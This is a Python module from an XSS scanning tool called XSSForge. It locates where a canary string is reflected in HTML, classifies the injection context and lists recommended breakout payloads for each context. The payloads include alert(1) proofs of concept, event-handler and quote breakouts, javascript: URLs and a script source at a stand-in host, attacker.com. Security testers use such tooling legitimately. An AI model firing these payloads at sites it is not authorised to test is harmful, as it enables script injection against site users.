"""
Context analyzer for XSSForge.

Detects where user input is reflected and determines the injection context.
"""

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

from bs4 import BeautifulSoup, Comment

from xssforge.payloads.generator import XSSContext


class ReflectionType(Enum):
    """Type of reflection found."""
    HTML_TEXT = "html_text"
    HTML_ATTRIBUTE = "html_attribute"
    HTML_COMMENT = "html_comment"
    SCRIPT_CONTENT = "script_content"
    STYLE_CONTENT = "style_content"
    URL_ATTRIBUTE = "url_attribute"
    EVENT_HANDLER = "event_handler"


@dataclass
class Reflection:
    """Represents a single reflection of input in response."""
    position: int
    context: XSSContext
    reflection_type: ReflectionType
    surrounding: str  # Surrounding code snippet
    tag_name: str | None = None
    attribute_name: str | None = None
    quote_char: str | None = None
    is_encoded: bool = False
    encoding_type: str | None = None
    breakout_needed: str | None = None


@dataclass
class ContextAnalysis:
    """Result of context analysis."""
    reflections: list[Reflection] = field(default_factory=list)
    filters_detected: dict[str, bool] = field(default_factory=dict)
    waf_indicators: list[str] = field(default_factory=list)
    recommended_payloads: list[str] = field(default_factory=list)


class ContextAnalyzer:
    """Analyzes HTML/JS context for XSS injection points."""

    # Canary patterns
    CANARY_PATTERN = r"xssforge[a-z0-9]{6}"
    DEFAULT_CANARY = "xssforgeabcdef"

    # URL attributes that can take javascript:
    URL_ATTRIBUTES = {
        "href", "src", "action", "formaction", "data", "poster",
        "background", "codebase", "cite", "icon", "manifest", "profile"
    }

    # Event handler attributes
    EVENT_ATTRIBUTES = {
        "onabort", "onblur", "onchange", "onclick", "ondblclick",
        "onerror", "onfocus", "onkeydown", "onkeypress", "onkeyup",
        "onload", "onmousedown", "onmousemove", "onmouseout",
        "onmouseover", "onmouseup", "onreset", "onresize", "onscroll",
        "onselect", "onsubmit", "onunload", "oninput", "onwheel",
        "ondrag", "ondragend", "ondragenter", "ondragleave", "ondragover",
        "ondragstart", "ondrop", "oncopy", "oncut", "onpaste",
        "onanimationend", "onanimationiteration", "onanimationstart",
        "ontransitionend", "onpointerdown", "onpointermove", "onpointerup",
        "onfocusin", "onfocusout", "oninvalid", "ontoggle",
    }

    # Characters to test for filtering
    TEST_CHARS = ['<', '>', '"', "'", '/', '(', ')', '=', '`', '{', '}']

    def __init__(self):
        self._soup_cache: dict[str, BeautifulSoup] = {}

    @staticmethod
    def generate_canary() -> str:
        """Generate a unique canary string."""
        import random
        import string
        suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"xssforge{suffix}"

    def analyze(self, html: str, canary: str) -> ContextAnalysis:
        """Analyze HTML response for reflections of canary."""
        result = ContextAnalysis()

        if canary not in html:
            return result

        # Find all reflection positions
        positions = self._find_all_positions(html, canary)

        for pos in positions:
            reflection = self._analyze_position(html, canary, pos)
            if reflection:
                result.reflections.append(reflection)

        # Detect filters
        result.filters_detected = self._detect_filters(html, canary)

        # Generate recommended payloads based on contexts
        result.recommended_payloads = self._recommend_payloads(result.reflections)

        return result

    def _find_all_positions(self, html: str, canary: str) -> list[int]:
        """Find all positions where canary appears."""
        positions = []
        start = 0
        while True:
            pos = html.find(canary, start)
            if pos == -1:
                break
            positions.append(pos)
            start = pos + 1
        return positions

    def _analyze_position(self, html: str, canary: str, pos: int) -> Reflection | None:
        """Analyze a single reflection position."""
        # Get surrounding context (500 chars before and after)
        start = max(0, pos - 500)
        end = min(len(html), pos + len(canary) + 500)
        context_window = html[start:end]
        relative_pos = pos - start

        # Check for encoding
        is_encoded, encoding_type = self._check_encoding(context_window, canary)

        # Determine context type
        context, reflection_type, details = self._determine_context(
            html, pos, canary, context_window, relative_pos
        )

        # Extract surrounding snippet (100 chars)
        snippet_start = max(0, pos - 50)
        snippet_end = min(len(html), pos + len(canary) + 50)
        surrounding = html[snippet_start:snippet_end]

        return Reflection(
            position=pos,
            context=context,
            reflection_type=reflection_type,
            surrounding=surrounding,
            tag_name=details.get("tag_name"),
            attribute_name=details.get("attribute_name"),
            quote_char=details.get("quote_char"),
            is_encoded=is_encoded,
            encoding_type=encoding_type,
            breakout_needed=details.get("breakout"),
        )

    def _check_encoding(self, context: str, canary: str) -> tuple[bool, str | None]:
        """Check if the canary is encoded in the response."""
        # HTML entity encoding
        html_encoded = canary.replace("<", "&lt;").replace(">", "&gt;")
        if html_encoded != canary and html_encoded in context:
            return True, "html_entity"

        # URL encoding
        import urllib.parse
        url_encoded = urllib.parse.quote(canary)
        if url_encoded != canary and url_encoded in context:
            return True, "url"

        # Check for partial encoding
        if "&lt;" in context or "&gt;" in context or "&quot;" in context:
            return True, "html_entity_partial"

        return False, None

    def _determine_context(
        self, html: str, pos: int, canary: str, window: str, rel_pos: int
    ) -> tuple[XSSContext, ReflectionType, dict[str, Any]]:
        """Determine the injection context."""
        details: dict[str, Any] = {}

        # Check if inside HTML comment
        if self._is_in_comment(html, pos):
            return XSSContext.HTML_COMMENT, ReflectionType.HTML_COMMENT, details

        # Check if inside script tag
        script_context = self._check_script_context(html, pos, canary)
        if script_context:
            return script_context

        # Check if inside style tag
        if self._is_in_style(html, pos):
            return XSSContext.CSS_VALUE, ReflectionType.STYLE_CONTENT, details

        # Check if inside an attribute
        attr_context = self._check_attribute_context(html, pos, canary)
        if attr_context:
            return attr_context

        # Default: HTML body text
        return XSSContext.HTML_BODY, ReflectionType.HTML_TEXT, details

    def _is_in_comment(self, html: str, pos: int) -> bool:
        """Check if position is inside an HTML comment."""
        # Find last <!-- before position
        comment_start = html.rfind("<!--", 0, pos)
        if comment_start == -1:
            return False

        # Find --> after comment start
        comment_end = html.find("-->", comment_start)
        if comment_end == -1:
            return True  # Unclosed comment

        return comment_end > pos

    def _is_in_style(self, html: str, pos: int) -> bool:
        """Check if position is inside a style tag."""
        # Find last <style before position
        style_start = html.lower().rfind("<style", 0, pos)
        if style_start == -1:
            return False

        # Find </style> after style start
        style_end = html.lower().find("</style>", style_start)
        if style_end == -1:
            return True  # Unclosed style

        return style_end > pos

    def _check_script_context(
        self, html: str, pos: int, canary: str
    ) -> tuple[XSSContext, ReflectionType, dict[str, Any]] | None:
        """Check if position is inside a script tag and determine JS context."""
        details: dict[str, Any] = {}

        # Find last <script before position
        lower_html = html.lower()
        script_start = lower_html.rfind("<script", 0, pos)
        if script_start == -1:
            return None

        # Find > after script tag start
        tag_end = html.find(">", script_start)
        if tag_end == -1 or tag_end > pos:
            return None  # In script tag attributes, not content

        # Find </script> after script start
        script_end = lower_html.find("</script>", script_start)
        if script_end != -1 and script_end < pos:
            return None  # After script close

        # We're inside script content - determine JS context
        script_content = html[tag_end + 1:pos]

        # Check for string context
        in_single = self._count_unescaped(script_content, "'") % 2 == 1
        in_double = self._count_unescaped(script_content, '"') % 2 == 1
        in_template = script_content.count("`") % 2 == 1

        if in_single:
            details["quote_char"] = "'"
            details["breakout"] = "'"
            return XSSContext.JAVASCRIPT_STRING_SINGLE, ReflectionType.SCRIPT_CONTENT, details
        elif in_double:
            details["quote_char"] = '"'
            details["breakout"] = '"'
            return XSSContext.JAVASCRIPT_STRING, ReflectionType.SCRIPT_CONTENT, details
        elif in_template:
            details["quote_char"] = "`"
            details["breakout"] = "`"
            return XSSContext.JAVASCRIPT_TEMPLATE, ReflectionType.SCRIPT_CONTENT, details
        else:
            return XSSContext.JAVASCRIPT_CODE, ReflectionType.SCRIPT_CONTENT, details

    def _check_attribute_context(
        self, html: str, pos: int, canary: str
    ) -> tuple[XSSContext, ReflectionType, dict[str, Any]] | None:
        """Check if position is inside an HTML attribute."""
        details: dict[str, Any] = {}

        # Look backwards for tag start
        tag_start = html.rfind("<", 0, pos)
        if tag_start == -1:
            return None

        # Check if we're before tag close - but handle self-closing and attributes with quotes
        tag_content = html[tag_start:pos + len(canary) + 200]

        # Find the actual tag end (>) that's not inside quotes
        in_single = False
        in_double = False
        tag_end_pos = -1
        for i, char in enumerate(tag_content):
            if char == '"' and not in_single:
                in_double = not in_double
            elif char == "'" and not in_double:
                in_single = not in_single
            elif char == '>' and not in_single and not in_double:
                tag_end_pos = i
                break

        if tag_end_pos != -1 and tag_end_pos < (pos - tag_start):
            return None  # After tag close

        # Extract the part before canary
        before_canary = html[tag_start:pos]

        # More robust attribute detection
        # Find the last attribute assignment before canary
        # Handle cases like: onload="startTimer('VALUE')"
        attr_pattern = r'(\w+)\s*=\s*(["\'])'
        matches = list(re.finditer(attr_pattern, before_canary))

        if not matches:
            # Try unquoted attribute
            unquoted_pattern = r'(\w+)\s*=\s*([^"\'>\s]+)$'
            unquoted_match = re.search(unquoted_pattern, before_canary)
            if unquoted_match:
                attr_name = unquoted_match.group(1).lower()
                details["attribute_name"] = attr_name
                details["quote_char"] = None
                tag_match = re.match(r"<(\w+)", before_canary)
                if tag_match:
                    details["tag_name"] = tag_match.group(1).lower()
                if attr_name in self.EVENT_ATTRIBUTES:
                    return XSSContext.JAVASCRIPT_CODE, ReflectionType.EVENT_HANDLER, details
                elif attr_name in self.URL_ATTRIBUTES:
                    return XSSContext.URL_HREF if attr_name == "href" else XSSContext.URL_SRC, ReflectionType.URL_ATTRIBUTE, details
                return XSSContext.HTML_ATTRIBUTE_UNQUOTED, ReflectionType.HTML_ATTRIBUTE, details
            return None

        # Check each attribute from last to first to find which one contains the canary
        for match in reversed(matches):
            attr_name = match.group(1).lower()
            quote = match.group(2)
            attr_start = match.end()

            # Find where this attribute value ends
            attr_value_region = before_canary[attr_start:]

            # Check if canary is within this attribute's value
            # Count quotes to see if attribute is still open
            # EVEN count (including 0) = attribute still OPEN (haven't seen closing quote)
            # ODD count = attribute CLOSED (saw the closing quote)
            quote_count = attr_value_region.count(quote)

            if quote_count % 2 == 1:
                continue  # Attribute is closed (odd = saw closing quote), try next one

            # Found the attribute containing the canary (even = still open)
            details["attribute_name"] = attr_name
            details["quote_char"] = quote

            # Extract tag name
            tag_match = re.match(r"<(\w+)", before_canary)
            if tag_match:
                details["tag_name"] = tag_match.group(1).lower()
            break
        else:
            return None  # No matching attribute found

        attr_name = details.get("attribute_name", "")
        quote = details.get("quote_char", "")

        # Find the attribute value for JS string analysis
        attr_match = None
        for m in matches:
            if m.group(1).lower() == attr_name:
                attr_match = m
                break

        # Determine specific context
        if attr_name in self.EVENT_ATTRIBUTES:
            # Check if inside a JS string within the event handler
            # e.g., onload="startTimer('VALUE')" - VALUE is in a JS string
            if attr_match:
                attr_value = before_canary[attr_match.end():]
            else:
                attr_value = ""

            # Count quotes to determine if we're in a JS string
            # The outer quote is the HTML attribute quote, inner quotes are JS strings
            js_single_quotes = self._count_unescaped(attr_value, "'")
            # For double quotes, subtract 1 if the attribute uses double quotes (that's the opening)
            js_double_quotes = self._count_unescaped(attr_value, '"')
            if quote == '"':
                js_double_quotes = max(0, js_double_quotes - 1)  # Don't count the attr opening quote

            if js_single_quotes % 2 == 1:
                # Inside a single-quoted JS string within the event handler
                details["breakout"] = "'"
                details["js_string_in_attr"] = True
                return XSSContext.JAVASCRIPT_STRING_SINGLE, ReflectionType.EVENT_HANDLER, details
            elif js_double_quotes % 2 == 1:
                # Inside a double-quoted JS string
                details["breakout"] = '"'
                details["js_string_in_attr"] = True
                return XSSContext.JAVASCRIPT_STRING, ReflectionType.EVENT_HANDLER, details
            else:
                details["breakout"] = quote if quote else " "
                return XSSContext.JAVASCRIPT_CODE, ReflectionType.EVENT_HANDLER, details
        elif attr_name in self.URL_ATTRIBUTES:
            details["breakout"] = quote if quote else " "
            return XSSContext.URL_HREF if attr_name == "href" else XSSContext.URL_SRC, ReflectionType.URL_ATTRIBUTE, details
        elif quote == '"':
            details["breakout"] = '"'
            return XSSContext.HTML_ATTRIBUTE_QUOTED, ReflectionType.HTML_ATTRIBUTE, details
        elif quote == "'":
            details["breakout"] = "'"
            return XSSContext.HTML_ATTRIBUTE_SINGLE, ReflectionType.HTML_ATTRIBUTE, details
        else:
            details["breakout"] = " "
            return XSSContext.HTML_ATTRIBUTE_UNQUOTED, ReflectionType.HTML_ATTRIBUTE, details

    def _count_unescaped(self, text: str, char: str) -> int:
        """Count unescaped occurrences of a character."""
        count = 0
        i = 0
        while i < len(text):
            if text[i] == char:
                # Check if escaped
                num_backslashes = 0
                j = i - 1
                while j >= 0 and text[j] == '\\':
                    num_backslashes += 1
                    j -= 1
                if num_backslashes % 2 == 0:
                    count += 1
            i += 1
        return count

    def _detect_filters(self, html: str, canary: str) -> dict[str, bool]:
        """Detect which characters/strings are being filtered."""
        filters = {}

        # This would require making additional requests with test payloads
        # For now, check what's present in the response
        filters["html_encoded"] = "&lt;" in html or "&gt;" in html
        filters["quotes_encoded"] = "&quot;" in html or "&#39;" in html

        return filters

    def _recommend_payloads(self, reflections: list[Reflection]) -> list[str]:
        """Recommend payloads based on detected contexts."""
        payloads = []

        for ref in reflections:
            if ref.context == XSSContext.HTML_BODY:
                if not ref.is_encoded:
                    payloads.extend([
                        "<img src=x onerror=alert(1)>",
                        "<svg onload=alert(1)>",
                        "<script>alert(1)</script>",
                    ])
                else:
                    payloads.extend([
                        "<img src=x onerror=alert`1`>",
                        "<svg/onload=alert(1)>",
                    ])

            elif ref.context in (XSSContext.HTML_ATTRIBUTE_QUOTED, XSSContext.HTML_ATTRIBUTE_SINGLE):
                q = ref.quote_char or '"'
                payloads.extend([
                    f"{q}><img src=x onerror=alert(1)>",
                    f"{q} onmouseover=alert(1) x={q}",
                    f"{q} onfocus=alert(1) autofocus x={q}",
                ])

            elif ref.context == XSSContext.HTML_ATTRIBUTE_UNQUOTED:
                payloads.extend([
                    " onmouseover=alert(1) ",
                    "><img src=x onerror=alert(1)>",
                ])

            elif ref.context == XSSContext.JAVASCRIPT_STRING:
                payloads.extend([
                    '";alert(1)//',
                    '"+alert(1)+"',
                    '</script><script>alert(1)</script>',
                ])

            elif ref.context == XSSContext.JAVASCRIPT_STRING_SINGLE:
                payloads.extend([
                    "';alert(1)//",
                    "'+alert(1)+'",
                    "</script><script>alert(1)</script>",
                ])

            elif ref.context == XSSContext.JAVASCRIPT_TEMPLATE:
                payloads.extend([
                    "${alert(1)}",
                    "`-alert(1)-`",
                ])

            elif ref.context == XSSContext.URL_HREF:
                payloads.extend([
                    "javascript:alert(1)",
                    "javascript:alert`1`",
                    "data:text/html,<script>alert(1)</script>",
                ])

            elif ref.context == XSSContext.URL_SRC:
                payloads.extend([
                    "javascript:alert(1)",
                    "data:text/javascript,alert(1)",
                    "//attacker.com/xss.js",
                ])

            elif ref.reflection_type == ReflectionType.EVENT_HANDLER:
                # JS strings inside event handlers need different breakouts
                if ref.context == XSSContext.JAVASCRIPT_STRING_SINGLE:
                    payloads.extend([
                        "');alert('1",
                        "');alert(1);//",
                        "'+alert(1)+'",
                    ])
                elif ref.context == XSSContext.JAVASCRIPT_STRING:
                    payloads.extend([
                        '");alert("1',
                        '");alert(1);//',
                        '"+alert(1)+"',
                    ])

            elif ref.context == XSSContext.HTML_COMMENT:
                payloads.extend([
                    "--><img src=x onerror=alert(1)>",
                    "--><svg onload=alert(1)>",
                ])

        return list(dict.fromkeys(payloads))  # Dedupe while preserving order


def detect_reflection_context(html: str, canary: str) -> list[Reflection]:
    """Convenience function to detect reflection contexts."""
    analyzer = ContextAnalyzer()
    result = analyzer.analyze(html, canary)
    return result.reflections
